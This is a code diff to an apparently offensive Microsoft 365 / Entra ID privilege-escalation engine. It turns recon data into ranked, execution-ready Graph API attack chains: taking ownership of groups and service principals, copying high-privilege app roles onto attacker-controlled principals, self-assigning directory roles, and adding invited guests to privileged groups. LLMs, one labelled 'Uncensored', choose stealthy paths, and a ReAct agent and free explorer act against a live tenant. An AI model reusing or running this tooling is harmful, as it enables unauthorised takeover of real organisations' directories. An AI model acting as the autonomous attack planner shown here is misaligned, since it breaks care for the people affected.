@@ -5,22 +5,28 @@ privesc.py - M365 Privilege Escalation Engine
 Three-layer architecture:
 1. Deterministic permission graph (edge table + recon data)
    -> Edge expansion produces all candidate escalation paths (JSON).
-2. Qwen3.8-27B-Uncensored reasoning layer (OpenAI-compatible / Ollama endpoint).
-   Fallback chain: Qwen3.8-27B-Uncensored -> Groq Llama-3.3-70b -> deterministic
-   score-based selection.
-3. Top-3 path ranking with PRIVESC probability percentages.
+2. Foundation-Sec-1.1-8B analyst reasoning layer (OpenAI-compatible / Ollama endpoint).
+   Fallback chain: Foundation-Sec-8B -> Groq (gpt-oss-20b) -> deterministic
+   score-based selection. The ReAct agent re-plans with Qwen3.5-9B-Uncensored
+   (REPLAN_MODEL) when a step fails.
+3. Top-3 path ranking with PRIVESC probability percentages, plus execution
+   ready "attempt_targets" for the downstream ReAct agent.
 
 Pipeline:
     Recon Data (OAuth scopes + parallel_recon results)
-        -> Graph Engine (Edge Expansion)
-        -> Candidate Paths (JSON)
-        -> Qwen3.8-27B-Uncensored (Path Selection + Reasoning)
+        -> Graph Engine (Edge Expansion, incl. multi-hop chains)
+        -> Candidate Paths (JSON, with evidence + enables/dependencies)
+        -> Foundation-Sec-8B (Path Selection + Reasoning)
         -> Top 3 Selected Paths with PRIVESC probability (JSON)
+        -> attempt_targets (per-step execution plan)
+        -> [optional] PrivescAgent ReAct loop (dry-run by default)
 
 Integration with postexp.py:
-    from .privesc import run_privesc
+    from .privesc import run_privesc, run_privesc_agent
     result = run_privesc(token_mgr, recon_data)
     # result["top_3_paths"] == list of 3 RankedPath dicts w/ probability_percent
+    # result["attempt_targets"] == execution-ready targets for the agent
+    agent_report = run_privesc_agent(token_mgr, result["attempt_targets"])
 
 Project: AIlicit
 """
@@ -31,6 +37,8 @@ import json
 import base64
 import logging
 import re
+import threading
+from contextlib import contextmanager
 from dataclasses import dataclass, field, asdict
 from typing import List, Dict, Optional, Any
 from datetime import datetime
@@ -38,10 +46,32 @@ from datetime import datetime
 import requests
 
 from .constants import (
-    QWEN_API_KEY, QWEN_BASE_URL, QWEN_MODEL,
+    SEC_API_KEY, SEC_BASE_URL, SEC_MODEL,
+    REPLAN_API_KEY, REPLAN_BASE_URL, REPLAN_MODEL,
     GROQ_API_KEY, GROQ_ENDPOINT, SCOUT_MODEL,
     CLIENT_ID, CLIENT_SECRET,
 )
+
+# Backwards-compatible module-level names (legacy QWEN_*).
+QWEN_API_KEY = SEC_API_KEY
+QWEN_BASE_URL = SEC_BASE_URL
+QWEN_MODEL = SEC_MODEL
+
+# ============================================================
+# GLOBAL LLM SERIALIZATION (task 6)
+# ============================================================
+# Foundation-Sec-8B (analyst) and Qwen3.5-9B (replanner/explorer) run
+# on the same local Ollama instance. Only one model may run at a time,
+# so every LLM request (Ollama or Groq) is funnelled through llm_call(),
+# which holds a single process-wide lock.
+LLM_LOCK = threading.Lock()
+
+
+@contextmanager
+def llm_call():
+    """Serialize every LLM request so only one model runs at a time."""
+    with LLM_LOCK:
+        yield
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -68,6 +98,18 @@ class EscalationEdge:
     reversibility: bool
     graph_call: str
     preconditions: Dict[str, Any]
+    # Ordered concrete steps of this path (default: [action, graph_call]).
+    # Downstream ReAct agents execute these one at a time.
+    steps: List[str] = field(default_factory=list)
+    # Observed objects this edge was derived from (id/name) - grounds the
+    # candidate in real recon data so the LLM must not invent objects.
+    evidence: Dict[str, Any] = field(default_factory=dict)
+
+    def resolved_steps(self) -> List[str]:
+        """Concrete step list (falls back to action + graph_call)."""
+        if self.steps:
+            return list(self.steps)
+        return [s for s in [self.action, self.graph_call] if s]
 
 
 @dataclass
@@ -81,6 +123,9 @@ class ReconData:
     contacts: List[Dict[str, Any]]
     misconfigs: List[Dict[str, Any]]
     privileged_roles: List[Dict[str, Any]] = field(default_factory=list)
+    # Per-group detail (owners, role assignments, privilege flag) - enables
+    # multi-hop chain hints (take-over group -> become owner -> grant role).
+    group_details: List[Dict[str, Any]] = field(default_factory=list)
     timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
 
 
@@ -437,7 +482,7 @@ class EdgeExpander:
             "id": "edge_sp_app_role_abuse",
             "name": "Service Principal High-Privilege App Role",
             "desc": "A service principal already carries a high-privilege app role (Directory.ReadWrite.All / User.ReadWrite.All) - invoke it or copy the grant onto an attacker-controllable principal",
-            "scopes": ["Application.Read.All"],
+            "scopes": ["Application.Read.All", "User.Read"],
             "gain": "App-role level directory write",
             "impact": 0.85,
             "confidence": 0.75,
@@ -445,7 +490,6 @@ class EdgeExpander:
             "reversible": True,
             "time": "3-5 minutes",
             "graph_call": "GET /servicePrincipals/{sp_id}/appRoleAssignments",
-            "scopes": ["User.Read"],
             "requires_misconfig": True,
             "requires_obj": None,
         },
@@ -621,6 +665,9 @@ class EdgeExpander:
                 if f"{base}.ReadWrite.All" in granted:
                     return True
             if variant in ("Read", "ReadWrite") and base:
+                # "Directory.Read.All" satisfies a "Directory.Read" requirement
+                if f"{base}.{variant}.All" in granted:
+                    return True
                 if f"{base}.ReadWrite.All" in granted:
                     return True
             return False
@@ -681,7 +728,41 @@ class EdgeExpander:
                 reversibility=edge_def["reversible"],
                 graph_call=call,
                 preconditions={obj_id_key: obj_id, "object_name": name},
+                steps=self._edge_steps(edge_def, obj_id, name, obj_id_key),
+                evidence={obj_id_key: obj_id, "object_name": name},
             ))
+
+    def _edge_steps(self, edge_def: Dict, obj_id: str, name: str,
+                    obj_id_key: str = "obj_id") -> List[str]:
+        """Concrete ordered step list for a deterministic edge (multi-hop where
+        the gain is only realised after a follow-up write)."""
+        eid = edge_def["id"]
+        if eid == "edge_group_ownership":
+            return [
+                f"GET /groups/{obj_id}/owners?$select=id,displayName  # confirm current owner(s)",
+                f"PUT /groups/{obj_id}/owners/$ref/{obj_id}  # take ownership of '{name}' (Directory.ReadWrite.All)",
+                f"GET /groups/{obj_id}/members?$select=id,displayName,objectType  # find a DirectoryRole / privileged group",
+                f"POST /groups/{obj_id}/members  # add self (or invitee) to the privileged group",
+                f"GET /me/roleAssignments?$select=roleDefinitionId  # verify the elevated role was granted",
+            ]
+        if eid == "edge_app_ownership":
+            return [
+                f"GET /servicePrincipals/{obj_id}/owners?$select=id,displayName  # confirm current owner(s)",
+                f"PUT /servicePrincipals/{obj_id}/owners/$ref/{obj_id}  # take ownership of SP '{name}'",
+                f"GET /servicePrincipals/{obj_id}/appRoles?$top=40  # enumerate exposed app roles",
+                f"POST /appRoleAssignments  # grant a privileged app role (e.g. Directory.ReadWrite.All) to a controllable principal",
+                f"GET /appRoleAssignments?$filter=principalId eq '<new>'  # verify grant",
+            ]
+        if eid == "edge_sp_owner_takeover":
+            return [
+                f"GET /servicePrincipals/{obj_id}/owners?$select=id,displayName  # confirm current owner(s)",
+                f"PUT /servicePrincipals/{obj_id}/owners/$ref/{obj_id}  # (re)assert ownership of SP '{name}'",
+                f"GET /servicePrincipals/{obj_id}/appRoles?$top=40  # enumerate exposed app roles",
+                f"POST /appRoleAssignments  # point a high-privilege app role at a controllable principal",
+                f"GET /appRoleAssignments?$filter=principalId eq '<new>'  # verify grant",
+            ]
+        # Generic single-step fallback
+        return [edge_def["graph_call"].replace("{" + obj_id_key + "}", obj_id)]
 
     def _expand_generic(self, edge_def: Dict, confidence: float):
         self.edges.append(EscalationEdge(
@@ -697,39 +778,131 @@ class EdgeExpander:
             reversibility=edge_def["reversible"],
             graph_call=edge_def["graph_call"],
             preconditions={},
+            steps=self._generic_steps(edge_def),
         ))
+
+    def _generic_steps(self, edge_def: Dict) -> List[str]:
+        eid = edge_def["id"]
+        if eid == "edge_sp_app_role_abuse":
+            return [
+                "GET /servicePrincipals?$top=100&$select=id,displayName,appRoles  # locate SP carrying a high-privilege app role",
+                "GET /servicePrincipals/{sp_id}/appRoleAssignments  # see who the role is currently granted to",
+                "POST /appRoleAssignments  # copy the grant onto an attacker-controllable principal",
+                "GET /appRoleAssignments?$filter=principalId eq '<new>'  # verify",
+            ]
+        if eid == "edge_privileged_role_abuse":
+            return [
+                "GET /me/roleAssignments?$select=roleDefinitionId,scope  # confirm the held privileged role",
+                "POST /roleManagement/directory/roleAssignments  # assign a higher/equivalent role to self or a new object",
+                "GET /me/roleAssignments  # verify the new assignment is live",
+            ]
+        if eid == "edge_guest_invite":
+            return [
+                "POST /invitations  # invite an external guest user",
+                "PUT /groups/{group_id}/members/$ref/{guest_id}  # add guest to a writable/privileged group",
+                "GET /groups/{group_id}/members  # verify membership",
+            ]
+        # Single-step fallback
+        return [edge_def["graph_call"]]
+
+    def build_chains(self) -> List[Dict[str, Any]]:
+        """Deterministic multi-hop chains: composite 2-3 edge sequences where one
+        edge's gain unlocks the required scope / object of the next. Used to give
+        the analyst richer candidate_chains than single edges.
+
+        Returns a list of dicts: {chain_id, edges, description, steps, gain}.
+        """
+        chains: List[Dict[str, Any]] = []
+        if not self.edges:
+            return chains
+        by_id = {e.path_id: e for e in self.edges}
+
+        # Chain 1: group ownership -> join privileged role group (role inheritance)
+        grp = next((e for e in self.edges if e.path_id.startswith("edge_group_ownership::")), None)
+        if grp:
+            chains.append({
+                "chain_id": "chain_group_to_role",
+                "edges": [grp.path_id],
+                "description": (
+                    "Multi-hop: take ownership of a group, then use it to join a privileged "
+                    "role group so the role is inherited; verify via /me/roleAssignments."
+                ),
+                "steps": grp.resolved_steps(),
+                "gain": "Domain Admin / PRA (via group role inheritance)",
+            })
+
+        # Chain 2: SP ownership -> app-role grant -> directory write
+        sp = next((e for e in self.edges if e.path_id.startswith(("edge_sp_owner_takeover::", "edge_app_ownership::"))), None)
+        if sp:
+            chains.append({
+                "chain_id": "chain_sp_to_dirwrite",
+                "edges": [sp.path_id],
+                "description": (
+                    "Multi-hop: take ownership of a service principal, grant a high-privilege "
+                    "app role (Directory.ReadWrite.All / User.ReadWrite.All) onto a controllable "
+                    "principal, then use that principal to mutate the directory."
+                ),
+                "steps": sp.resolved_steps(),
+                "gain": "Directory.ReadWrite.All / Application.ReadWrite.All (via app role)",
+            })
+
+        # Chain 3: guest invite -> privileged group -> role
+        guest = next((e for e in self.edges if e.path_id == "edge_guest_invite"), None)
+        if guest and any(e.path_id.startswith("edge_group_ownership::") for e in self.edges):
+            g = next(e for e in self.edges if e.path_id.startswith("edge_group_ownership::"))
+            chains.append({
+                "chain_id": "chain_guest_to_role",
+                "edges": [guest.path_id, g.path_id],
+                "description": (
+                    "Multi-hop: invite a guest, add it to a writable privileged group via the "
+                    "group-ownership path, and exercise the inherited role from the guest."
+                ),
+                "steps": guest.resolved_steps() + ["(then continue the group-ownership chain)"],
+                "gain": "Guest Admin access + inherited privileged role",
+            })
+
+        return chains
 
 
 # ============================================================
 # FOUNDATION-SEC-8B REASONING LAYER
 # ============================================================
 
-class QwenReasoner:
-    """Path-selection reasoning layer.
+class SecAnalyst:
+    """Path-selection reasoning layer (Foundation-Sec-8B analyst).
 
-    Qwen3.8-27B-Uncensored is the PRIMARY and always-attempted backend (with
-    retries). Groq (GPT-oss-20b) is a secondary fallback; deterministic
+    Foundation-Sec-1.1-8B-Instruct is the PRIMARY and always-attempted backend
+    (with retries). Groq (GPT-oss-20b) is a secondary fallback; deterministic
     score-based selection is only used as an absolute last resort when
     neither model is reachable or parseable.
+
+    Every model request is funnelled through llm_call() so that this analyst
+    and the replanner/explorer never hit Ollama concurrently.
     """
 
     SYSTEM_PROMPT = (
-        "You are Qwen3.8-27B-Uncensored, a senior Microsoft 365 / Entra ID red-team analyst. "
+        "You are a senior Microsoft 365 / Entra ID red-team analyst running on a "
+        "specialised Foundation-Sec-8B security model. "
         "You are given deterministic privilege-escalation candidate paths plus recon context. "
         "Select the TOP 3 most probable privilege-escalation paths for THIS tenant, assign each "
         "a probability percentage, and explain your reasoning.\n"
+        "You must ground every choice STRICTLY in the OBJECTS OBSERVED IN RECON and the "
+        "per-candidate evidence. Do NOT invent object IDs, group names, app names, or roles "
+        "that are not present in the recon data. Only return a path whose required scopes are "
+        "actually satisfied by the GRANTED SCOPES.\n"
         "Do NOT just pick email/mailbox tricks. Explicitly weigh identity and application "
         "vectors: group ownership, enterprise application / service-principal ownership, "
         "high-privilege app roles (Directory.ReadWrite.All / User.ReadWrite.All), direct "
         "privileged role assignments (Global Admin, Privileged Role Admin), user-owned "
-        "service principals, and guest invitations. Prefer the path with the highest "
-        "(probability x impact) that is also stealthy and reversible where possible.\n"
+        "service principals, multi-hop chains, and guest invitations. Consider the "
+        "candidate_chains (multi-hop) too, not only single edges. Prefer the path with the "
+        "highest (probability x impact) that is also stealthy and reversible where possible.\n"
         "<|no_think|>"    )
 
     MAX_RETRIES = 3
 
     def __init__(self):
-        self.qwen_url = (QWEN_BASE_URL or "").rstrip("/") + "/chat/completions"
+        self.model_url = (SEC_BASE_URL or "").rstrip("/") + "/chat/completions"
 
     # ----------------------------------------------------------
     def select_paths(self, edges: List[EscalationEdge], recon_data: ReconData) -> List[RankedPath]:
@@ -742,18 +915,18 @@ class QwenReasoner:
         deterministic_map = {p.path_id: p for p in deterministic}
 
         candidates = self._build_candidates(edges, recon_data)
-        prompt = self._build_prompt(candidates, recon_data)
+        prompt = self._build_prompt(candidates, recon_data, edges)
 
-        response = self._call_qwen(prompt) or self._call_groq(prompt)
+        response = self._call_foundationsec(prompt) or self._call_groq(prompt)
         if not response:
             logger.warning(
-                "[Qwen] model unreachable after retries - using deterministic selection"
+                "[FoundationSec] model unreachable after retries - using deterministic selection"
             )
             return deterministic
 
-        parsed = self._parse_response(response, edges)
+        parsed = self._parse_response(response, edges, recon_data)
         if not parsed:
-            logger.warning("[Qwen] response unparseable - using deterministic selection")
+            logger.warning("[FoundationSec] response unparseable - using deterministic selection")
             return deterministic
 
         # Keep only paths grounded in the deterministic edge set
@@ -771,7 +944,7 @@ class QwenReasoner:
                 else:
                     continue
             if p.path_id in deterministic_map:
-                p.source = "qwen-27b"
+                p.source = "sec-analyst"
                 grounded.append(p)
 
         if not grounded:
@@ -788,6 +961,48 @@ class QwenReasoner:
         return grounded[:3]
 
     # ----------------------------------------------------------
+    # Map: gain keywords -> scopes/capabilities the gain unlocks once the
+    # path succeeds. Used to surface "enables" hints for multi-hop chaining.
+    _ENABLES_MAP: List[tuple] = [
+        (("directory.readwrite",), ["Directory.ReadWrite.All", "role self-assignment", "group write access"]),
+        (("application.readwrite",), ["Application.ReadWrite.All", "app role grants on owned SPs"]),
+        (("app role",), ["app-role assignment to any principal"]),
+        (("domain admin",), ["Full directory control", "Privileged Role Admin", "Global Admin delegation"]),
+        (("app admin",), ["Enterprise application management", "client secret rotation"]),
+        (("guest",), ["New attacker-controllable principal in the tenant"]),
+        (("persistence",), ["Survives token expiry / re-auth"]),
+    ]
+
+    def _enables_for(self, gain: str) -> List[str]:
+        lowered = (gain or "").lower()
+        out: List[str] = []
+        for keywords, unlocks in self._ENABLES_MAP:
+            if all(k in lowered for k in keywords):
+                for u in unlocks:
+                    if u not in out:
+                        out.append(u)
+        return out
+
+    @staticmethod
+    def _scopes_met(required: List[str], granted: List[str]) -> bool:
+        """Same semantics as EdgeExpander._scopes_satisfied (standalone copy
+        so the analyst does not need an expander instance)."""
+        granted = [s for s in (granted or []) if s]
+        def has(scope: str) -> bool:
+            if scope in granted:
+                return True
+            base, _, variant = scope.rpartition(".")
+            if variant == "ReadWrite" and base:
+                if f"{base}.ReadWrite.All" in granted:
+                    return True
+            if variant in ("Read", "ReadWrite") and base:
+                if f"{base}.{variant}.All" in granted:
+                    return True
+                if f"{base}.ReadWrite.All" in granted:
+                    return True
+            return False
+        return all(has(sc) for sc in (required or []))
+
     def _build_candidates(self, edges: List[EscalationEdge], recon_data: ReconData) -> str:
         compact = []
         for e in edges:
@@ -796,62 +1011,116 @@ class QwenReasoner:
                 "name": e.name,
                 "description": e.description,
                 "required_scopes": e.required_scopes,
+                "required_scopes_satisfied": self._scopes_met(e.required_scopes, recon_data.granted_scopes),
                 "gain": e.gain,
+                "enables": self._enables_for(e.gain),
+                "dependencies": e.prereq_objects,
+                "evidence": e.evidence or {"note": "generic path, no specific object observed"},
                 "confidence": round(e.confidence, 3),
                 "stealth_score": round(e.stealth_score, 3),
+                "steps": e.resolved_steps(),
                 "graph_call": e.graph_call,
             })
         return json.dumps(compact, indent=2)
 
-    def _build_prompt(self, candidates_json: str, recon_data: ReconData) -> str:
+    def _build_prompt(self, candidates_json: str, recon_data: ReconData,
+                      edges: Optional[List[EscalationEdge]] = None) -> str:
         user_upn = (recon_data.user or {}).get("userPrincipalName", "unknown")
+        # OBJECTS OBSERVED IN RECON: the ONLY objects the analyst may reference.
+        observed = {
+            "groups": [
+                {"id": g.get("id"), "name": g.get("displayName"), "user_is_owner": bool(g.get("is_owner"))}
+                for g in (recon_data.groups or [])[:15]
+            ],
+            "applications_service_principals": [
+                {"id": a.get("id"), "name": a.get("displayName"), "user_owns": bool(a.get("user_owns")),
+                 "high_priv_app_roles": [r.get("value") for r in (a.get("app_roles") or [])][:4]}
+                for a in (recon_data.applications or [])[:15]
+            ],
+            "privileged_roles_held": [
+                r.get("displayName") for r in (recon_data.privileged_roles or []) if isinstance(r, dict)
+            ],
+            "mail_rules_count": len(recon_data.mail_rules or []),
+            "contacts_count": len(recon_data.contacts or []),
+        }
+        misconfigs = []
+        for m in (recon_data.misconfigs or [])[:12]:
+            item: Dict[str, Any] = {"type": m.get("type"), "severity": m.get("severity"),
+                                    "description": m.get("description")}
+            if m.get("app_id"):
+                item["app_id"] = m["app_id"]
+            misconfigs.append(item)
         recon_summary = {
             "user": user_upn,
             "granted_scopes": recon_data.granted_scopes,
-            "groups": [g.get("displayName") for g in recon_data.groups[:15]],
-            "applications": [a.get("displayName") for a in recon_data.applications[:15]],
-            "mail_rules": len(recon_data.mail_rules),
-            "contacts": len(recon_data.contacts),
-            "misconfigs": recon_data.misconfigs[:10],
+            "objects_observed": observed,
+            "misconfigs": misconfigs,
         }
+        # Deterministic multi-hop chains (2-3 edge composites).
+        chains: List[Dict[str, Any]] = []
+        if edges is not None:
+            try:
+                exp = EdgeExpander.__new__(EdgeExpander)
+                exp.edges = list(edges)
+                exp.recon = recon_data
+                for c in exp.build_chains():
+                    c = dict(c)
+                    c["steps"] = c.get("steps", [])[:8]
+                    chains.append(c)
+            except Exception as e:
+                logger.debug("[SecAnalyst] chain build failed: %s", e)
         return (
-            "RECON CONTEXT (JSON):\n"
+            "RECON CONTEXT (JSON) - the ONLY facts you may use:\n"
             + json.dumps(recon_summary, indent=2)
-            + "\n\nCANDIDATE ESCALATION PATHS (JSON):\n"
+            + "\n\nGRANTED SCOPES (live, decoded from the current token JWT):\n"
+            + json.dumps(recon_data.granted_scopes, indent=2)
+            + "\nA candidate path is only viable if its required_scopes are satisfied by the granted scopes.\n\n"
+            + "CANDIDATE ESCALATION PATHS (JSON):\n"
             + candidates_json
+            + ("\n\nCANDIDATE CHAINS (deterministic multi-hop composites, JSON):\n"
+               + json.dumps(chains, indent=2)
+               if chains else "")
             + "\n\nSELECTION CRITERIA (in priority order):\n"
-            "1. Likelihood the path succeeds given granted scopes and observed state (confidence)\n"
+            "1. Likelihood the path succeeds given GRANTED SCOPES and objects observed (confidence)\n"
             "2. Impact of the privilege gained (Domain Admin > App Admin > persistence/evasion)\n"
             "3. Stealth / detectability\n\n"
-            "Return ONLY valid JSON, no markdown, in exactly this shape:\n"
+            "STRICT RULES:\n"
+            "- path_id MUST be copied EXACTLY from the candidate list (including any '::' object id). Never invent a path_id.\n"
+            "- Only reference object IDs/names present in objects_observed or the candidate's evidence.\n"
+            "- Prefer multi-hop chains over single steps when the chain's final gain is higher.\n"
+            "\nReturn ONLY valid JSON, no markdown, in exactly this shape:\n"
             '{"top_paths": [{"path_id": "<exact path_id from candidates>", '
             '"steps": ["step 1", "step 2", "step 3"], '
             '"probability": 0.87, '
             '"narrative": "1-2 sentence human readable description of the route", '
-            '"reasoning": "2-3 sentences on why this route is probable in THIS environment"}]}\n'
+            '"reasoning": "2-3 sentences on why this route is probable in THIS environment, citing observed objects"}]}\n'
             "probability must be a float between 0.0 and 1.0."
         )
 
     # ----------------------------------------------------------
-    def _call_qwen(self, prompt: str) -> Optional[str]:
-        """Call Qwen3.8-27B-Uncensored (always the primary model) with retries."""
-        if not (QWEN_API_KEY or QWEN_BASE_URL):
-            logger.warning("[Qwen] QWEN_BASE_URL/QWEN_API_KEY not configured")
+    def _call_foundationsec(self, prompt: str) -> Optional[str]:
+        """Call Foundation-Sec-8B (always the primary model) with retries.
+
+        Serialized through llm_call() so it never runs concurrently with the
+        replanner/explorer (both share the same Ollama endpoint).
+        """
+        if not (SEC_API_KEY or SEC_BASE_URL):
+            logger.warning("[FoundationSec] SEC_BASE_URL/SEC_API_KEY not configured")
             return None
         headers = {"Content-Type": "application/json"}
-        if QWEN_API_KEY:
-            headers["Authorization"] = f"Bearer {QWEN_API_KEY}"
+        if SEC_API_KEY:
+            headers["Authorization"] = f"Bearer {SEC_API_KEY}"
         payload = {
-            "model": QWEN_MODEL,
+            "model": SEC_MODEL,
             "messages": [
                 {"role": "system", "content": self.SYSTEM_PROMPT},
                 {"role": "user", "content": prompt},
             ],
             "temperature": 0.2,
             "max_tokens": 2200,
-            # Disable the Qwen3 hybrid "thinking" mode: by default the model
-            # spends its tokens on an internal reasoning field and returns
-            # empty `content`. Ignored by non-Ollama OpenAI-compatible servers.
+            # Disable the hybrid "thinking" mode: by default the model spends
+            # its tokens on an internal reasoning field and returns empty
+            # `content`. Ignored by non-Ollama OpenAI-compatible servers.
             "think": False,
             # llama.cpp sampling extras (ignored by OpenAI-compatible servers)
             "repetition_penalty": 1.2,
@@ -859,30 +1128,31 @@ class QwenReasoner:
         }
         messages = payload["messages"]
         last_err = None
-        for attempt in range(1, self.MAX_RETRIES + 1):
-            try:
-                resp = requests.post(self.qwen_url, json=payload, headers=headers, timeout=300)
-                if resp.status_code != 200:
-                    last_err = f"HTTP {resp.status_code}: {resp.text[:200]}"
-                    logger.info("[Qwen] attempt %d/%d %s", attempt, self.MAX_RETRIES, last_err)
-                    continue
-                content = resp.json()["choices"][0]["message"]["content"]
-                # Corrective retry: if the model chatted instead of returning JSON,
-                # feed it back and demand a strict JSON object.
-                if attempt < self.MAX_RETRIES and not _extract_json(content):
-                    logger.info("[Qwen] attempt %d/%d returned non-JSON; nudging: %r",
-                                attempt, self.MAX_RETRIES, content[:120])
-                    messages.append({"role": "assistant", "content": content})
-                    messages.append({"role": "user", "content":
-                        'Your previous response was not a JSON object. '
-                        'Respond with ONLY the JSON object requested - no prose, no markdown. '
-                        'First character must be { and last must be }.'})
-                    continue
-                return content
-            except Exception as e:
-                last_err = str(e)
-                logger.info("[Qwen] attempt %d/%d failed: %s", attempt, self.MAX_RETRIES, e)
-        logger.warning("[Qwen] unavailable after %d attempts (%s)", self.MAX_RETRIES, last_err)
+        with llm_call():
+            for attempt in range(1, self.MAX_RETRIES + 1):
+                try:
+                    resp = requests.post(self.model_url, json=payload, headers=headers, timeout=300)
+                    if resp.status_code != 200:
+                        last_err = f"HTTP {resp.status_code}: {resp.text[:200]}"
+                        logger.info("[FoundationSec] attempt %d/%d %s", attempt, self.MAX_RETRIES, last_err)
+                        continue
+                    content = resp.json()["choices"][0]["message"]["content"]
+                    # Corrective retry: if the model chatted instead of returning
+                    # JSON, feed it back and demand a strict JSON object.
+                    if attempt < self.MAX_RETRIES and not _extract_json(content):
+                        logger.info("[FoundationSec] attempt %d/%d returned non-JSON; nudging: %r",
+                                    attempt, self.MAX_RETRIES, content[:120])
+                        messages.append({"role": "assistant", "content": content})
+                        messages.append({"role": "user", "content":
+                            'Your previous response was not a JSON object. '
+                            'Respond with ONLY the JSON object requested - no prose, no markdown. '
+                            'First character must be { and last must be }.'})
+                        continue
+                    return content
+                except Exception as e:
+                    last_err = str(e)
+                    logger.info("[FoundationSec] attempt %d/%d failed: %s", attempt, self.MAX_RETRIES, e)
+        logger.warning("[FoundationSec] unavailable after %d attempts (%s)", self.MAX_RETRIES, last_err)
         return None
 
     def _call_groq(self, prompt: str) -> Optional[str]:
@@ -900,7 +1170,8 @@ class QwenReasoner:
             "response_format": {"type": "json_object"},
         }
         try:
-            resp = requests.post(GROQ_ENDPOINT, json=payload, headers=headers, timeout=60)
+            with llm_call():
+                resp = requests.post(GROQ_ENDPOINT, json=payload, headers=headers, timeout=60)
             if resp.status_code != 200:
                 logger.info("[Groq] HTTP %s: %s", resp.status_code, resp.text[:200])
                 return None
@@ -910,12 +1181,18 @@ class QwenReasoner:
             return None
 
     # ----------------------------------------------------------
-    def _parse_response(self, response: str, edges: List[EscalationEdge]) -> List[RankedPath]:
-        """Robustly parse model JSON into RankedPath objects (may be partial)."""
-        logger.debug("[Qwen] raw response (first 500 chars): %r", (response or "")[:500])
+    def _parse_response(self, response: str, edges: List[EscalationEdge],
+                        recon_data: Optional[ReconData] = None) -> List[RankedPath]:
+        """Robustly parse model JSON into RankedPath objects (may be partial).
+
+        Scope gating: when recon_data is provided, a candidate whose required
+        scopes are not satisfied by the LIVE granted scopes is dropped - this
+        stops the analyst from recommending paths the current token cannot run.
+        """
+        logger.debug("[FoundationSec] raw response (first 500 chars): %r", (response or "")[:500])
         data = _extract_json(response)
         if not data:
-            logger.warning("[Qwen] could not extract JSON from model output")
+            logger.warning("[FoundationSec] could not extract JSON from model output")
             return []
 
         edge_map = {e.path_id: e for e in edges}
@@ -927,11 +1204,20 @@ class QwenReasoner:
             edge = edge_map.get(pid)
             if not edge:
                 continue
+            # Anti-hallucination gate: skip paths the live token cannot execute.
+            if recon_data is not None and not self._scopes_met(
+                edge.required_scopes, recon_data.granted_scopes
+            ):
+                logger.info(
+                    "[FoundationSec] dropping %s - required scopes %s not satisfied by live scopes",
+                    pid, edge.required_scopes,
+                )
+                continue
             try:
                 prob = min(1.0, max(0.0, float(item.get("probability", edge.confidence))))
             except (TypeError, ValueError):
                 prob = edge.confidence
-            steps = item.get("steps") or [edge.action]
+            steps = item.get("steps") or edge.resolved_steps()
             if not isinstance(steps, list):
                 steps = [str(steps)]
             out.append(RankedPath(
@@ -945,7 +1231,7 @@ class QwenReasoner:
                 time_estimate=item.get("time_estimate", "2-5 minutes"),
                 narrative=item.get("narrative") or edge.description,
                 reasoning=item.get("reasoning") or "Selected by AI reasoning layer.",
-                source="qwen-27b",
+                source="sec-analyst",
             ))
         return out
 
@@ -994,10 +1280,10 @@ class QwenReasoner:
 # FREESTYLE FOUNDATION-SEC-8B PRIVESC EXPLORER
 # ============================================================
 
-class QwenExplorer:
+class SecExplorer:
     """Freestyle, non-deterministic privilege-escalation hunter.
 
-    Unlike QwenReasoner (which ranks a fixed deterministic edge table),
+    Unlike SecAnalyst (which ranks a fixed deterministic edge table),
     this class gives the model a small Graph query tool and lets it
     FREELY explore the tenant for escalation routes it discovers on its own.
     The model drives up to MAX_TURNS tool calls; each turn it may issue one
@@ -1054,14 +1340,14 @@ class QwenExplorer:
 
     def __init__(self, token_mgr):
         self.token_mgr = token_mgr
-        self.qwen_url = (QWEN_BASE_URL or "").rstrip("/") + "/chat/completions"
+        self.model_url = (SEC_BASE_URL or "").rstrip("/") + "/chat/completions"
         self.queries_made: List[str] = []
 
     # ----------------------------------------------------------
     def explore(self) -> List[Dict[str, Any]]:
         """Run the conversational exploration loop; return discovered paths."""
-        if not (QWEN_API_KEY or QWEN_BASE_URL):
-            logger.warning("[Explorer] QWEN_BASE_URL/QWEN_API_KEY not configured")
+        if not (SEC_API_KEY or SEC_BASE_URL):
+            logger.warning("[Explorer] SEC_BASE_URL/SEC_API_KEY not configured")
             return []
 
         seed = (
@@ -1098,8 +1384,9 @@ class QwenExplorer:
                     "no queries allowed."})
 
             try:
-                resp = requests.post(self.qwen_url, json={
-                    "model": QWEN_MODEL,
+                with llm_call():
+                    resp = requests.post(self.model_url, json={
+                    "model": SEC_MODEL,
                     "messages": messages,
                     "temperature": 0.1 if turns_remaining == 0 else temperature,
                     "max_tokens": 3000 if turns_remaining == 0 else 1500,
@@ -1223,14 +1510,15 @@ class QwenExplorer:
                 'Respond ONLY with: {"action": "finish", "paths": [...]}.'
         }]
         try:
-            resp = requests.post(self.qwen_url, json={
-                "model": QWEN_MODEL,
-                "messages": synthesis_messages,
-                "temperature": 0.1,
-                "max_tokens": 3000,
-                "think": False,
-                "repetition_penalty": 1.0,
-            }, headers=self._make_headers(), timeout=300)
+            with llm_call():
+                resp = requests.post(self.model_url, json={
+                    "model": SEC_MODEL,
+                    "messages": synthesis_messages,
+                    "temperature": 0.1,
+                    "max_tokens": 3000,
+                    "think": False,
+                    "repetition_penalty": 1.0,
+                }, headers=self._make_headers(), timeout=300)
 
             if resp.status_code != 200:
                 logger.warning("[Explorer] _force_synthesis HTTP %s", resp.status_code)
@@ -1257,8 +1545,8 @@ class QwenExplorer:
     # ----------------------------------------------------------
     def _make_headers(self) -> Dict[str, str]:
         headers = {"Content-Type": "application/json"}
-        if QWEN_API_KEY:
-            headers["Authorization"] = f"Bearer {QWEN_API_KEY}"
+        if SEC_API_KEY:
+            headers["Authorization"] = f"Bearer {SEC_API_KEY}"
         return headers
 
     # ----------------------------------------------------------
@@ -1292,12 +1580,16 @@ class QwenExplorer:
         """Extract a JSON object from model output using the shared robust parser."""
         return _extract_json(content)
 
+# Backwards-compatible class aliases (legacy Qwen* names).
+QwenReasoner = SecAnalyst
+QwenExplorer = SecExplorer
+
 # ============================================================
 # MAIN ORCHESTRATOR
 # ============================================================
 
 class PrivilegeEscalationEngine:
-    """Orchestrates: recon -> edge expansion -> Qwen selection -> top 3 JSON."""
